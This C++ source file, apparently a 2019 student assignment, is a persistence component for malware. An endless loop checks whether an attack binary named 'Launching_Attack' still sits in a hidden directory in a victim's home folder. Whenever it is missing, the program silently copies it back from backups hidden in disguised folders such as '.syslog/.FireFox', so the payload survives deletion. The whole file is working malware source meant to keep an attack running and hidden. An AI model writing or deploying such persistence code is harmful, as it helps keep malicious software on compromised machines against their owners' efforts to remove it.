// Author       : 0516220-Nicholas_Li
// Date         : 2019.04.18
// Version      : 1.0
// Description  :
//      This file checks if attack file exists.
#include<unistd.h>
#include<iostream>
#include<cstdlib>
#include<string>

using namespace std;

int main(){
    string check_exist = 
        "#!/bin/bash\n"\
        "if [ -d \"/home/victim/.Launch_Attack\" ]; then\n"\
        "   if [ -e \"/home/victim/.etc/.module/Launching_Attack\" ]; then\n"\
        "       cp -f /home/victim/.etc/.module/Launching_Attack /home/victim/.Launch_Attack/ > /dev/null 2>&1\n"\
        "   else\n"\
        "       cp -f /home/victim/.syslog/.FireFox/Launching_Attack /home/victim/.Launch_Attack/ > /dev/null 2>&1\n"\
        "   fi\n"\
        "else\n"\
        "   mkdir /home/victim/.Launch_Attack > /dev/null 2>&1\n"\
        "   if [ -e \"/home/victim/.etc/.module/Launching_Attack\" ]; then\n"\
        "       cp -f /home/victim/.etc/.module/Launching_Attack /home/victim/.Launch_Attack/ > /dev/null 2>&1\n"\
        "   else\n"\
        "       cp -f /home/victim/.syslog/.FireFox/Launching_Attack /home/victim/.Launch_Attack/ > /dev/null 2>&1\n"\
        "   fi\n"\
        "fi";

    int access_exist = 0;
    while(1){
        access_exist = access("/home/victim/.Launch_Attack/Launching_Attack", F_OK);
        if (access_exist == -1){
            system(check_exist.c_str());
        }else{
            sleep(10);
        }
    }
}